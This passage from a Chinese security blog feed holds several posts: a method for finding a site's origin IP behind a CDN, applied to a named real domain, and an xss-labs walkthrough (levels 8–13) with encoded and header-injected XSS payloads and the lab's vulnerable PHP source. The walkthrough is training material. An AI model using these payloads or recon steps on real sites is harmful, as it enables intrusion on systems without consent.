<p>下面是通过<code>ping</code>和<code>超级ping</code>进行测试<br>事例<br>可以看见他用ip是<code>163.181.36.190</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201030155542.png"></p>
<p>我不加www进行ping他<br>他的ip变成<code>47.91.205.164</code>这个可能就是真实主机<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201030160124.png"></p>
<p>上面测试还是不能确定是真的主机<br>下面在用<code>超级ping</code>进行测试在进行判断<br>下面是超级ping的是<code>www.sqsmxx.cn</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201030160612.png"><br>可以看见有很多ip</p>
<p>我去掉<code>www</code><br>可以看见全部的ip都是<code>47.91.205.164</code>说明就是真实ip就是<code>47.91.205.164</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201030160819.png"></p>
<p>下面介绍一个网站找寻真实ip的网站是<a href="https://get-site-ip.com/">https://get-site-ip.com/</a><br>是直接探测一下<code>www.sqsmxx.cn</code>他的结果就是<code>47.91.205.164</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201030161604.png"></p>
<h2 id="国外地址请求来找寻真实ip"><a href="#国外地址请求来找寻真实ip" class="headerlink" title="国外地址请求来找寻真实ip"></a>国外地址请求来找寻真实ip</h2><p>比如CDN没有在其他国家用CDN那么我就可以用指定那个国家进行ping他就会出来真实ip</p>
<p>应为我的机场配置终端代理只能UDP/TCP,不能ICMP这个我就补测试了</p>
<h2 id="利用SSL证书寻找真实IP"><a href="#利用SSL证书寻找真实IP" class="headerlink" title="利用SSL证书寻找真实IP"></a>利用SSL证书寻找真实IP</h2><p>证书里面的ip就可能是真实ip</p>
<p>下面我用Censys搜索引擎搜索证书<br>Censys地址<a href="https://censys.io/">https://censys.io/</a></p>
<p>参考下面的网站<br><a href="https://zhuanlan.zhihu.com/p/604726041">https://zhuanlan.zhihu.com/p/60472604</a></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>绕过</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>win7安装安全狗</title>
    <url>/2020/08/23/win7%E5%AE%89%E8%A3%85%E5%AE%89%E5%85%A8%E7%8B%97/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="http://free.safedog.cn/website_safedog.html">官方安全狗下载地址</a><br>我下载的是Apache版的<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200910113451.png"></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>先启动Apache服务器<br>确定他是启动的状态<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200910113634.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200910113741.png"></p>
<p>他会自动检测Apache如果没有检查出来Apache查询启动</p>
<p>重新启动在安装Apache<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200910113911.png"></p>
<h2 id="测试一下"><a href="#测试一下" class="headerlink" title="测试一下"></a>测试一下</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200910114333.png"></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>windows自带的文件校验工具MD5,SHA1，SHA256，</title>
    <url>/2019/09/11/windows%E8%87%AA%E5%B8%A6%E7%9A%84%E6%96%87%E4%BB%B6%E6%A0%A1%E9%AA%8C%E5%B7%A5%E5%85%B7MD5,SHA1%EF%BC%8CSHA256/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>这个我就演示下载好的树莓派的kali linux镜像<br>我下载的这个<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416114038141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"><br>下载完成后com进入下载的目录里面，也可以输入完整路径<br>下载完成要解压出来，<br>也可以校验一下是否下载时缺少什么吗</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -hashfile   下载的文件    hash的类型</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416114749648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>好软件使用</category>
      </categories>
      <tags>
        <tag>好软件使用</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs  Less8-15关卡</title>
    <url>/2020/12/23/xss-labsLess8-15/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>输入<code>script &#39;&quot;&gt;&lt; on On</code>看看他过滤什么东西<br>发现<code>&quot;&gt;&lt;</code>被实体化了<code>On</code>变成小写的了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222095050.png"></p>
<p>发现我们输入的也被写到了<br><code>script</code>变成<code>scr_ipt</code>，<code>&quot;</code>转换成<code>&amp;quot</code>，<code>on</code>变成<code>o_n</code>，<code>On</code>变成<code>o_n</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222095300.png"></p>
<p>我们输入<code>javascript:alert(1);</code>来点击链接进行弹窗</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222102111.png"></p>
<p>发现<code>javascript:alert(1);</code>被转换成<code>javascr_ipt:alert(1);</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222102239.png"></p>
<p>我们可以进行编码啊，<code>js</code>代码又不管你什么编码都一样的效果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">javascript:alert(<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>上面HTML编码后变成</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&amp;<span class="comment">#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x61;&amp;#x27;&amp;#x29;</span></span><br></pre></td></tr></table></figure>
<p>我们就输入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&amp;<span class="comment">#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x61;&amp;#x27;&amp;#x29;</span></span><br></pre></td></tr></table></figure>
<p>我们输入点击<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222102808.png"></p>
<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>输入<code>script &#39;&quot;&gt;&lt; on On</code>看看他过滤什么东西</p>
<p>可以看见下面说你的链接不合法，什么是不合法没有办法我就看了一下他的源码<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222113334.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level10.php?keyword=well done!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level9&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.htmlspecialchars($str).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===strpos($str7,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.$str7.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.strlen($str7).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $str7;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看见源码上写参数必须有<code>http://</code><br>上面过滤<code>script,on,src,data,href,&quot;</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222103833.png"><br>我们输入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x61;&amp;#x27;&amp;#x29;</span></span><br></pre></td></tr></table></figure>
<p>发现他没有弹窗<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222104503.png"></p>
<p>看一下源码<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222104639.png"><br>看看我们能不能叫前面的<code>http://</code>用<code>/**/</code>注释掉<br>变成</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;/*http://*/&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x61;&amp;#x27;&amp;#x29;&quot;</span>&gt;友情链接&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>我们输入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*http://*/</span>&amp;<span class="comment">#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x61;&amp;#x27;&amp;#x29;</span></span><br></pre></td></tr></table></figure>
<p>发现<code>/*http://*/</code>在前面没有注释掉啊<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222105220.png"></p>
<p>我就想放到后面不就好了吗用//来闭合</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x61;&amp;#x27;&amp;#x29;//http://&quot;</span>&gt;友情链接&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>我们输入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&amp;<span class="comment">#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x61;&amp;#x27;&amp;#x29;//http://</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222105532.png"></p>
<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>他的输入点在url上<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222110756.png"><br>我们输入<code>&lt;script&gt;alert(&#39;a&#39;)&lt;/script&gt;</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222110841.png"><br>看一下网页源码<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222111057.png"><br>他重要都已经过滤了没有思路了<br>我只能看一下源码了代码审计一下<br>下面可以看见有一个<code>t_sort</code> GET请求，他还过滤<code>&gt;&lt;</code>转换成空</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level11.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level10&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.strlen($str).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222111816.png"><br>我们URL输入<code>http://127.0.0.1/xss/level10.php?t_sort=aaa</code><br>他也没有显示啊<br>看一下网页源代码<br>可以看见有<br><code>hidden</code>属性就是隐藏的意思，用<code>hidden</code>叫代码进行了隐藏<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222112041.png"></p>
<p>隐藏但是代码还是执行了啊</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;我们输入到内容&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>我们可以用<code>&quot;</code>进行闭合然后在添加事件触发弹窗<br>应为事件都是达到条件才会触发我们，但是应为他的是隐藏的<br><code>type=&quot;hidden&quot;</code>在最后面我们就可以注释掉啊，在添加一个<code>type=&quot;text&quot;</code>输入框<br>下面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_sort&quot;</span>  value=<span class="string">&quot;1&quot;</span>onfocus=<span class="string">&#x27;alert(1)&#x27;</span> type=<span class="string">&quot;text&quot;</span> <span class="comment">//&quot; type=&quot;hidden&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们输入<code>1&quot;onfocus=&#39;alert(1)&#39; type=&quot;text&quot; //</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222115121.png"></p>
<h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>他的输入到地方也是在URL里面<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222115213.png"></p>
<p>我还是输入<code>script &#39;&quot;&gt;&lt; on On</code>看看他过滤什么<br>看一下网页源码和level10差不多<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222115334.png"></p>
<p>我叫下面提交的参数<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222134340.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222134404.png"><br><code>t_sort</code>这个参数有返回<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222134714.png"><br>我们输入level10的提交的<code>1&quot;onfocus=&#39;alert(1)&#39; type=&quot;text&quot; //</code>看看他过滤什么<br>发现<code>&quot;</code>被实体化了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222134954.png"><br>我输入<code>&gt;&lt;</code><br>也是被实体化了</p>
<p>没有思路了</p>
<p><strong>看一下代码审计一下</strong><br>可以看见下面的代码有一个<code>$_SERVER[&#39;HTTP_REFERER&#39;]</code><br><code>$_SERVER</code> 是 PHP 预定义变量之一，可以直接使用，它是一个包含了诸如头信息（header）、路径（path）及脚本位置（script locations）信息的数组。<br><code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>里面的<code>HTTP_REFERER</code>是链接到当前页面的前一页面的 URL 地址，</p>
<p><code>$str33</code>变量只过滤了<code>&lt;&gt;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level12.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level11&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.strlen($str).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>在<code>level10</code>访问到<code>level11</code>就会触发</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222141215.png"><br>进入<code>level11</code>后我们查看一下网页源代码<br>下面就有返回了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222141318.png"></p>
<p>点击确定他会请求<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222141936.png"><br>我就用burp修改里面的请求</p>
<p>可以看见http请求有一个<code>Referer</code>字段，<code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>就会取<code>Referer</code>字段的内容<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222141720.png"></p>
<p>我在这个地方输入<code>AAA</code>他的表单就有显示出来<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222142147.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_ref&quot;</span>  value=<span class="string">&quot;他会显示在这个地方&quot;</span> type=<span class="string">&quot;hidden&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>进行分析改成这样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_ref&quot;</span>  value=<span class="string">&quot;1&quot;</span>onfocus=<span class="string">&#x27;alert(1)&#x27;</span> type=<span class="string">&quot;text&quot;</span> <span class="comment">//&quot; type=&quot;hidden&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们在<code>Referer</code>字段改成<code>1&quot;onfocus=&#39;alert(1)&#39; type=&quot;text&quot; //</code><br>请求出来可以看见返回的<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222142627.png"><br>我们在浏览器打开<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222142723.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222143007.png"></p>
<h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>我直接查看他的网页源代码<br>发现他就是<code>User-Agent</code>字段啊<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222143156.png"><br>burp抓包看看<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222143530.png"></p>
<p>我直接叫<code>User-Agent</code>字段啊数据改成<code>level11</code>的那样<br>进行分析改成这样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;t_ref&quot;</span>  value=<span class="string">&quot;1&quot;</span>onfocus=<span class="string">&#x27;alert(1)&#x27;</span> type=<span class="string">&quot;text&quot;</span> <span class="comment">//&quot; type=&quot;hidden&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们在<code>User-Agent</code>字段字段改成<code>1&quot;onfocus=&#39;alert(1)&#39; type=&quot;text&quot; //</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222143835.png"><br>burp的回话在浏览器打开</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222143921.png"></p>
<h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>我还是直接查看网页源代码<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222144225.png"></p>
<p>发现这次在<code>Cookie</code>字段里面<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201222144245.png"></p>
<p>和<code>level11</code>和<code>level12</code>的方法进行修改<code>Cookie</code>字段内容</p>
<p>进行分析改成这样</p>
